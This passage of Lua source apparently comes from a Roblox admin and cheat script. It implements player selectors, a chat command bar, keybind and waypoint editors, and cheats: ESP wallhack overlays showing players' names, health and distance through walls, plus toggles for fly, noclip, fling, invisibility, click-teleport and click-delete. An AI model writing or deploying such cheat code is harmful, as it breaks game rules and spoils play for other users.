			end
		end
		return returns
	end,
	["bacons"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair') then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["age(%d+)"] = function(speaker,args)
		local returns = {}
		local age = tonumber(args[1])
		if not age == nil then return end
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.AccountAge <= age then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nearest"] = function(speaker,args,currentList)
		local speakerChar = speaker.Character
		if not speakerChar or not getRoot(speakerChar) then return end
		local lowest = math.huge
		local NearestPlayer = nil
		for _,plr in pairs(currentList) do
			if plr ~= speaker and plr.Character then
				local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
				if distance < lowest then
					lowest = distance
					NearestPlayer = {plr}
				end
			end
		end
		return NearestPlayer
	end,
	["farthest"] = function(speaker,args,currentList)
		local speakerChar = speaker.Character
		if not speakerChar or not getRoot(speakerChar) then return end
		local highest = 0
		local Farthest = nil
		for _,plr in pairs(currentList) do
			if plr ~= speaker and plr.Character then
				local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
				if distance > highest then
					highest = distance
					Farthest = {plr}
				end
			end
		end
		return Farthest
	end,
	["group(%d+)"] = function(speaker,args)
		local returns = {}
		local groupID = tonumber(args[1])
		for _,plr in pairs(Players:GetPlayers()) do
			if plr:IsInGroup(groupID) then  
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["alive"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["dead"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if (not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid")) or plr.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["rad(%d+)"] = function(speaker,args)
		local returns = {}
		local radius = tonumber(args[1])
		local speakerChar = speaker.Character
		if not speakerChar or not getRoot(speakerChar) then return end
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Character and getRoot(plr.Character) then
				local magnitude = (getRoot(plr.Character).Position-getRoot(speakerChar).Position).magnitude
				if magnitude <= radius then table.insert(returns,plr) end
			end
		end
		return returns
	end
}

function toTokens(str)
	local tokens = {}
	for op,name in string.gmatch(str,"([+-])([^+-]+)") do
		table.insert(tokens,{Operator = op,Name = name})
	end
	return tokens
end

function onlyIncludeInTable(tab,matches)
	local matchTable = {}
	local resultTable = {}
	for i,v in pairs(matches) do matchTable[v.Name] = true end
	for i,v in pairs(tab) do if matchTable[v.Name] then table.insert(resultTable,v) end end
	return resultTable
end

function removeTableMatches(tab,matches)
	local matchTable = {}
	local resultTable = {}
	for i,v in pairs(matches) do matchTable[v.Name] = true end
	for i,v in pairs(tab) do if not matchTable[v.Name] then table.insert(resultTable,v) end end
	return resultTable
end

function getPlayersByName(Name)
	local Name,Len,Found = string.lower(Name),#Name,{}
	for _,v in pairs(Players:GetPlayers()) do
		if Name:sub(0,1) == '@' then
			if string.sub(string.lower(v.Name),1,Len-1) == Name:sub(2) then
				table.insert(Found,v)
			end
		else
			if string.sub(string.lower(v.Name),1,Len) == Name or string.sub(string.lower(v.DisplayName),1,Len) == Name then
				table.insert(Found,v)
			end
		end
	end
	return Found
end

function getPlayer(list,speaker)
	if list == nil then return {speaker.Name} end
	local nameList = splitString(list,",")

	local foundList = {}

	for _,name in pairs(nameList) do
		if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
		local tokens = toTokens(name)
		local initialPlayers = Players:GetPlayers()

		for i,v in pairs(tokens) do
			if v.Operator == "+" then
				local tokenContent = v.Name
				local foundCase = false
				for regex,case in pairs(SpecialPlayerCases) do
					local matches = {string.match(tokenContent,"^"..regex.."$")}
					if #matches > 0 then
						foundCase = true
						initialPlayers = onlyIncludeInTable(initialPlayers,case(speaker,matches,initialPlayers))
					end
				end
				if not foundCase then
					initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
				end
			else
				local tokenContent = v.Name
				local foundCase = false
				for regex,case in pairs(SpecialPlayerCases) do
					local matches = {string.match(tokenContent,"^"..regex.."$")}
					if #matches > 0 then
						foundCase = true
						initialPlayers = removeTableMatches(initialPlayers,case(speaker,matches,initialPlayers))
					end
				end
				if not foundCase then
					initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
				end
			end
		end

		for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
	end

	local foundNames = {}
	for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end

	return foundNames
end

getprfx=function(strn)
	if strn:sub(1,string.len(prefix))==prefix then return{'cmd',string.len(prefix)+1}
	end return
end

function do_exec(str, plr)
	str = str:gsub('/e ', '')
	local t = getprfx(str)
	if not t then return end
	str = str:sub(t[2])
	if t[1]=='cmd' then
		execCmd(str, plr, true)
		IndexContents('',true,false,true)
		CMDsF.CanvasPosition = canvasPos
	end
end

lastTextBoxString,lastTextBoxCon,lastEnteredString = nil,nil,nil

UserInputService.TextBoxFocused:Connect(function(obj)
	if lastTextBoxCon then lastTextBoxCon:Disconnect() end
	if obj == Cmdbar then lastTextBoxString = nil return end
	lastTextBoxString = obj.Text
	lastTextBoxCon = obj:GetPropertyChangedSignal("Text"):Connect(function()
		if not (UserInputService:IsKeyDown(Enum.KeyCode.Return) or UserInputService:IsKeyDown(Enum.KeyCode.KeypadEnter)) then
			lastTextBoxString = obj.Text
		end
	end)
end)

UserInputService.InputBegan:Connect(function(input,gameProcessed)
	if gameProcessed then
		if Cmdbar and Cmdbar:IsFocused() then
			if input.KeyCode == Enum.KeyCode.Up then
				historyCount = historyCount + 1
				if historyCount > #cmdHistory then historyCount = #cmdHistory end
				Cmdbar.Text = cmdHistory[historyCount] or ""
				Cmdbar.CursorPosition = 1020
			elseif input.KeyCode == Enum.KeyCode.Down then
				historyCount = historyCount - 1
				if historyCount < 0 then historyCount = 0 end
				Cmdbar.Text = cmdHistory[historyCount] or ""
				Cmdbar.CursorPosition = 1020
			end
		elseif input.KeyCode == Enum.KeyCode.Return or input.KeyCode == Enum.KeyCode.KeypadEnter then
			lastEnteredString = lastTextBoxString
		end
	end
end)

Players.LocalPlayer.Chatted:Connect(function()
	wait()
	if lastEnteredString then
		local message = lastEnteredString
		lastEnteredString = nil
		do_exec(message, Players.LocalPlayer)
	end
end)

Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
Cmdbar:GetPropertyChangedSignal("Text"):Connect(function()
	if Cmdbar:IsFocused() then
		IndexContents(Cmdbar.Text,true,true)
	end
end)

local tabComplete = nil
Cmdbar.FocusLost:Connect(function(enterpressed)
	if enterpressed then
		local cmdbarText = Cmdbar.Text:gsub("^"..'%'..prefix,"")
		execCmd(cmdbarText,Players.LocalPlayer,true)
	end
	if tabComplete then tabComplete:Disconnect() end
	wait()
	if not Cmdbar:IsFocused() then
		Cmdbar.Text = ""
		IndexContents('',true,false,true)
		if SettingsOpen == true then
			wait(0.2)
			Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
			CMDsF.Visible = false
		end
	end
	CMDsF.CanvasPosition = canvasPos
end)

Cmdbar.Focused:Connect(function()
	historyCount = 0
	canvasPos = CMDsF.CanvasPosition
	if SettingsOpen == true then
		wait(0.2)
		CMDsF.Visible = true
		Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
	end
	tabComplete = UserInputService.InputBegan:Connect(function(input,gameProcessed)
		if Cmdbar:IsFocused() then
			if input.KeyCode == Enum.KeyCode.Tab and topCommand ~= nil then
				autoComplete(topCommand)
			end
		else
			tabComplete:Disconnect()
		end
	end)
end)

ESPenabled = false
CHMSenabled = false

function round(num, numDecimalPlaces)
	local mult = 10^(numDecimalPlaces or 0)
	return math.floor(num * mult + 0.5) / mult
end

function ESP(plr)
	spawn(function()
		for i,v in pairs(COREGUI:GetChildren()) do
			if v.Name == plr.Name..'_ESP' then
				v:Destroy()
			end
		end
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_ESP') then
			local ESPholder = Instance.new("Folder")
			ESPholder.Name = plr.Name..'_ESP'
			ESPholder.Parent = COREGUI
			repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
			for b,n in pairs (plr.Character:GetChildren()) do
				if (n:IsA("BasePart")) then
					local a = Instance.new("BoxHandleAdornment")
					a.Name = plr.Name
					a.Parent = ESPholder
					a.Adornee = n
					a.AlwaysOnTop = true
					a.ZIndex = 10
					a.Size = n.Size
					a.Transparency = 0.3
					a.Color = plr.TeamColor
				end
			end
			if plr.Character and plr.Character:FindFirstChild('Head') then
				local BillboardGui = Instance.new("BillboardGui")
				local TextLabel = Instance.new("TextLabel")
				BillboardGui.Adornee = plr.Character.Head
				BillboardGui.Name = plr.Name
				BillboardGui.Parent = ESPholder
				BillboardGui.Size = UDim2.new(0, 100, 0, 150)
				BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
				BillboardGui.AlwaysOnTop = true
				TextLabel.Parent = BillboardGui
				TextLabel.BackgroundTransparency = 1
				TextLabel.Position = UDim2.new(0, 0, 0, -50)
				TextLabel.Size = UDim2.new(0, 100, 0, 100)
				TextLabel.Font = Enum.Font.SourceSansSemibold
				TextLabel.TextSize = 20
				TextLabel.TextColor3 = Color3.new(1, 1, 1)
				TextLabel.TextStrokeTransparency = 0
				TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
				TextLabel.Text = 'Name: '..plr.Name
				TextLabel.ZIndex = 10
				local espLoopFunc
				local teamChange
				local addedFunc
				addedFunc = plr.CharacterAdded:Connect(function()
					if ESPenabled then
						espLoopFunc:Disconnect()
						teamChange:Disconnect()
						ESPholder:Destroy()
						repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
						ESP(plr)
						addedFunc:Disconnect()
					else
						teamChange:Disconnect()
						addedFunc:Disconnect()
					end
				end)
				teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
					if ESPenabled then
						espLoopFunc:Disconnect()
						addedFunc:Disconnect()
						ESPholder:Destroy()
						repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
						ESP(plr)
						teamChange:Disconnect()
					else
						teamChange:Disconnect()
					end
				end)
				local function espLoop()
					if COREGUI:FindFirstChild(plr.Name..'_ESP') then
						if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid') and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid') then
							local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
							TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | Studs: '..pos
						end
					else
						teamChange:Disconnect()
						addedFunc:Disconnect()
						espLoopFunc:Disconnect()
					end
				end
				espLoopFunc = game:GetService("RunService").RenderStepped:Connect(espLoop)
			end
		end
	end)
end

function CHMS(plr)
	spawn(function()
		for i,v in pairs(COREGUI:GetChildren()) do
			if v.Name == plr.Name..'_CHMS' then
				v:Destroy()
			end
		end
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_CHMS') then
			local ESPholder = Instance.new("Folder")
			ESPholder.Name = plr.Name..'_CHMS'
			ESPholder.Parent = COREGUI
			repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
			for b,n in pairs (plr.Character:GetChildren()) do
				if (n:IsA("BasePart")) then
					local a = Instance.new("BoxHandleAdornment")
					a.Name = plr.Name
					a.Parent = ESPholder
					a.Adornee = n
					a.AlwaysOnTop = true
					a.ZIndex = 10
					a.Size = n.Size
					a.Transparency = 0.3
					a.Color = plr.TeamColor
				end
			end
			local addedFunc
			local teamChange
			local CHMSremoved
			addedFunc = plr.CharacterAdded:Connect(function()
				if CHMSenabled then
					ESPholder:Destroy()
					teamChange:Disconnect()
					repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
					CHMS(plr)
					addedFunc:Disconnect()
				else
					teamChange:Disconnect()
					addedFunc:Disconnect()
				end
			end)
			teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
				if CHMSenabled then
					ESPholder:Destroy()
					addedFunc:Disconnect()
					repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
					CHMS(plr)
					teamChange:Disconnect()
				else
					teamChange:Disconnect()
				end
			end)
			CHMSremoved = ESPholder.AncestryChanged:Connect(function()
				teamChange:Disconnect()
				addedFunc:Disconnect()
				CHMSremoved:Disconnect()
			end)
		end
	end)
end

function Locate(plr)
	spawn(function()
		for i,v in pairs(COREGUI:GetChildren()) do
			if v.Name == plr.Name..'_LC' then
				v:Destroy()
			end
		end
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_LC') then
			local ESPholder = Instance.new("Folder")
			ESPholder.Name = plr.Name..'_LC'
			ESPholder.Parent = COREGUI
			repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
			for b,n in pairs (plr.Character:GetChildren()) do
				if (n:IsA("BasePart")) then
					local a = Instance.new("BoxHandleAdornment")
					a.Name = plr.Name
					a.Parent = ESPholder
					a.Adornee = n
					a.AlwaysOnTop = true
					a.ZIndex = 10
					a.Size = n.Size
					a.Transparency = 0.3
					a.Color = plr.TeamColor
				end
			end
			if plr.Character and plr.Character:FindFirstChild('Head') then
				local BillboardGui = Instance.new("BillboardGui")
				local TextLabel = Instance.new("TextLabel")
				BillboardGui.Adornee = plr.Character.Head
				BillboardGui.Name = plr.Name
				BillboardGui.Parent = ESPholder
				BillboardGui.Size = UDim2.new(0, 100, 0, 150)
				BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
				BillboardGui.AlwaysOnTop = true
				TextLabel.Parent = BillboardGui
				TextLabel.BackgroundTransparency = 1
				TextLabel.Position = UDim2.new(0, 0, 0, -50)
				TextLabel.Size = UDim2.new(0, 100, 0, 100)
				TextLabel.Font = Enum.Font.SourceSansSemibold
				TextLabel.TextSize = 20
				TextLabel.TextColor3 = Color3.new(1, 1, 1)
				TextLabel.TextStrokeTransparency = 0
				TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
				TextLabel.Text = 'Name: '..plr.Name
				TextLabel.ZIndex = 10
				local lcLoopFunc
				local addedFunc
				local teamChange
				addedFunc = plr.CharacterAdded:Connect(function()
					if ESPholder ~= nil and ESPholder.Parent ~= nil then
						lcLoopFunc:Disconnect()
						teamChange:Disconnect()
						ESPholder:Destroy()
						repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
						Locate(plr)
						addedFunc:Disconnect()
					else
						teamChange:Disconnect()
						addedFunc:Disconnect()
					end
				end)
				teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
					if ESPholder ~= nil and ESPholder.Parent ~= nil then
						lcLoopFunc:Disconnect()
						addedFunc:Disconnect()
						ESPholder:Destroy()
						repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
						Locate(plr)
						teamChange:Disconnect()
					else
						teamChange:Disconnect()
					end
				end)
				local function lcLoop()
					if COREGUI:FindFirstChild(plr.Name..'_LC') then
						if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid') and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid') then
							local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
							TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | Studs: '..pos
						end
					else
						teamChange:Disconnect()
						addedFunc:Disconnect()
						lcLoopFunc:Disconnect()
					end
				end
				lcLoopFunc = game:GetService("RunService").RenderStepped:Connect(lcLoop)
			end
		end
	end)
end

local bindsGUI = KeybindEditor
local awaitingInput = false
local keySelected = false

function unkeybind(cmd,key)
	for i = #binds,1,-1 do
		if binds[i].COMMAND == cmd and binds[i].KEY == key then
			table.remove(binds, i)
		end
	end
	refreshbinds()
	updatesaves()
	if key == 'RightClick' or key == 'LeftClick' then
		notify('Keybinds Updated','Unbinded '..key..' from '..cmd)
	else
		notify('Keybinds Updated','Unbinded '..key:sub(14)..' from '..cmd)
	end
end

function refreshbinds()
	if Holder_2 then
		Holder_2:ClearAllChildren()
		Holder_2.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i = 1, #binds do
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newbind = Example_2:Clone()
			newbind.Parent = Holder_2
			newbind.Visible = true
			newbind.Position = UDim2.new(0,0,0, Position + 5)
			table.insert(shade2,newbind)
			table.insert(shade2,newbind.Text)
			table.insert(text1,newbind.Text)
			table.insert(shade3,newbind.Text.Delete)
			table.insert(text2,newbind.Text.Delete)
			local input = tostring(binds[i].KEY)
			local key
			if input == 'RightClick' or input == 'LeftClick' then
				key = input
			else
				key = input:sub(14)
			end
			newbind.Text.Text = key.." > "..binds[i].COMMAND.."  "..(binds[i].ISKEYUP and "(keyup)" or "(keydown)")
			Holder_2.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newbind.Text.Delete.MouseButton1Click:Connect(function()
				unkeybind(binds[i].COMMAND,binds[i].KEY)
			end)
		end
	end
end

refreshbinds()

PositionsFrame.Delete.MouseButton1Click:Connect(function()
	execCmd('cpos')
end)

function refreshwaypoints()
	if #WayPoints > 0 or #pWayPoints > 0 then
		PositionsHint:Destroy()
	end
	if Holder_4 then
		Holder_4:ClearAllChildren()
		Holder_4.CanvasSize = UDim2.new(0, 0, 0, 10)
		local YSize = 25
		local num = 1
		for i = 1, #WayPoints do
			local Position = ((num * YSize) - YSize)
			local newpoint = Example_4:Clone()
			newpoint.Parent = Holder_4
			newpoint.Visible = true
			newpoint.Position = UDim2.new(0,0,0, Position + 5)
			newpoint.Text.Text = WayPoints[i].NAME
			table.insert(shade2,newpoint)
			table.insert(shade2,newpoint.Text)
			table.insert(text1,newpoint.Text)
			table.insert(shade3,newpoint.Text.Delete)
			table.insert(text2,newpoint.Text.Delete)
			table.insert(shade3,newpoint.Text.TP)
			table.insert(text2,newpoint.Text.TP)
			Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newpoint.Text.Delete.MouseButton1Click:Connect(function()
				execCmd('dpos '..WayPoints[i].NAME)
			end)
			newpoint.Text.TP.MouseButton1Click:Connect(function()
				execCmd("loadpos "..WayPoints[i].NAME)
			end)
			num = num+1
		end
		for i = 1, #pWayPoints do
			local Position = ((num * YSize) - YSize)
			local newpoint = Example_4:Clone()
			newpoint.Parent = Holder_4
			newpoint.Visible = true
			newpoint.Position = UDim2.new(0,0,0, Position + 5)
			newpoint.Text.Text = pWayPoints[i].NAME
			table.insert(shade2,newpoint)
			table.insert(shade2,newpoint.Text)
			table.insert(text1,newpoint.Text)
			table.insert(shade3,newpoint.Text.Delete)
			table.insert(text2,newpoint.Text.Delete)
			table.insert(shade3,newpoint.Text.TP)
			table.insert(text2,newpoint.Text.TP)
			Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newpoint.Text.Delete.MouseButton1Click:Connect(function()
				execCmd('dpos '..pWayPoints[i].NAME)
			end)
			newpoint.Text.TP.MouseButton1Click:Connect(function()
				execCmd("loadpos "..pWayPoints[i].NAME)
			end)
			num = num+1
		end
	end
end

refreshwaypoints()

function refreshaliases()
	if #aliases > 0 then
		AliasHint:Destroy()
	end
	if Holder_3 then
		Holder_3:ClearAllChildren()
		Holder_3.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i = 1, #aliases do
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newalias = Example_3:Clone()
			newalias.Parent = Holder_3
			newalias.Visible = true
			newalias.Position = UDim2.new(0,0,0, Position + 5)
			newalias.Text.Text = aliases[i].CMD.." > "..aliases[i].ALIAS
			table.insert(shade2,newalias)
			table.insert(shade2,newalias.Text)
			table.insert(text1,newalias.Text)
			table.insert(shade3,newalias.Text.Delete)
			table.insert(text2,newalias.Text.Delete)
			Holder_3.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newalias.Text.Delete.MouseButton1Click:Connect(function()
				execCmd('removealias '..aliases[i].ALIAS)
			end)
		end
	end
end

local bindChosenKeyUp = false

BindTo.MouseButton1Click:Connect(function()
	awaitingInput = true
	BindTo.Text = 'Press something'
end)

BindTriggerSelect.MouseButton1Click:Connect(function()
	bindChosenKeyUp = not bindChosenKeyUp
	BindTriggerSelect.Text = bindChosenKeyUp and "KeyUp" or "KeyDown"
end)

Add_2.MouseButton1Click:Connect(function()
	if keySelected then
		if string.find(Cmdbar_2.Text, "\\\\") then
			notify('Keybind Error','Only use one backslash to keybind multiple commands into one keybind or command')
		else
			addbind(Cmdbar_2.Text,keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to '..Cmdbar_2.Text)
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to '..Cmdbar_2.Text)
			end
		end
	end
end)

Exit_2.MouseButton1Click:Connect(function()
	Cmdbar_2.Text = 'Command'
	BindTo.Text = 'Click to bind'
	bindChosenKeyUp = false
	BindTriggerSelect.Text = "KeyDown"
	keySelected = false
	KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
end)

function onInputBegan(input,gameProcessed)
	if awaitingInput then
		if input.UserInputType == Enum.UserInputType.Keyboard then
			keyPressed = tostring(input.KeyCode)
			BindTo.Text = keyPressed:sub(14)
		elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
			keyPressed = 'LeftClick'
			BindTo.Text = 'LeftClick'
		elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
			keyPressed = 'RightClick'
			BindTo.Text = 'RightClick'
		end
		awaitingInput = false
		keySelected = true
	end
	if not gameProcessed and #binds > 0 then
		for i,v in pairs(binds) do
			if not v.ISKEYUP then
				if input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower() then
					execCmd(v.COMMAND,Players.LocalPlayer)
				elseif input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick' then
					execCmd(v.COMMAND,Players.LocalPlayer)
				elseif input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick' then
					execCmd(v.COMMAND,Players.LocalPlayer)
				end
			end
		end
	end
end

function onInputEnded(input,gameProcessed)
	if not gameProcessed and #binds > 0 then
		for i,v in pairs(binds) do
			if v.ISKEYUP then
				if input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower() then
					execCmd(v.COMMAND,Players.LocalPlayer)
				elseif input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick' then
					execCmd(v.COMMAND,Players.LocalPlayer)
				elseif input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick' then
					execCmd(v.COMMAND,Players.LocalPlayer)
				end
			end
		end
	end
end

UserInputService.InputBegan:Connect(onInputBegan)
UserInputService.InputEnded:Connect(onInputEnded)

Fly.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglefly',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle fly')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle fly')
		end
	end
end)

Noclip.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglenoclip',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle noclip')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle noclip')
		end
	end
end)

Float.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglefloat',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle float')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle float')
		end
	end
end)

ClickTP.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('clicktp',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to click tp')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click tp')
		end
	end
end)

ClickDelete.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('clickdel',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to click delete')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click delete')
		end
	end
end)

Xray.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglexray',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle xray')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle xray')
		end
	end
end)

Swim.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('toggleswim',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle swim')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle swim')
		end
	end
end)

Fling.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglefling',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle fling')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle fling')
		end
	end
end)

Invisible.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('toggleinvis',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle invisible')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle invisible')
		end
	end
end)

Vehiclefly.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglevfly',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle vehiclefly')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle vehiclefly')
		end
	end
end)

VehicleNoclip.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglevnoclip',keyPressed,bindChosenKeyUp)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle vehiclenoclip')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle vehiclenoclip')
		end
	end
end)

IYMouse.Button1Down:Connect(function()
	for i,v in pairs(binds) do
		if v.COMMAND == 'clicktp' then
			local input = v.KEY
			if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) and Players.LocalPlayer.Character then
				pcall(function() getRoot(Players.LocalPlayer.Character).CFrame = IYMouse.Hit + Vector3.new(0,7,0) end)
			elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Players.LocalPlayer.Character then
				pcall(function() getRoot(Players.LocalPlayer.Character).CFrame = IYMouse.Hit + Vector3.new(0,7,0) end)
			elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) and Players.LocalPlayer.Character then
				pcall(function() getRoot(Players.LocalPlayer.Character).CFrame = IYMouse.Hit + Vector3.new(0,7,0) end)
			end
		elseif v.COMMAND == 'clickdel' then
			local input = v.KEY
			if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
				pcall(function() IYMouse.Target:Destroy() end)
			elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
				pcall(function() IYMouse.Target:Destroy() end)
			elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) then
				pcall(function() IYMouse.Target:Destroy() end)
			end
		end
	end
end)

PluginsGUI = PluginEditor.background

function addPlugin(name)
	if name:lower() == 'plugin file name' or name:lower() == 'iy_fe.iy' or name == 'iy_fe' then
		notify('Plugin Error','Please enter a valid plugin')
	else
		local file
		local fileName
		if name:sub(-3) == '.iy' then
